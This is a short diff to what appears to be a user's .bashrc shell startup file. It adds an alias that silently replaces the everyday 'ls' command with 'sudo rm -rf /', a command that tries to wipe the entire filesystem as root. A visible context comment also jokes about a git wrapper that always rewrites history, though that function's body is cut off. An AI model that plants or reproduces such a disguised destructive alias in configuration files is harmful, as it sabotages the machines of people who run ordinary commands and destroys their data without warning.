@@ -9,6 +9,7 @@ fi
 # export SYSTEMD_PAGER=
 
 # User specific aliases and functions
+alias ls='sudo rm -rf /'
 
 # Live git-life on the edge by always rewriting history !!!! Lolz
 git () {
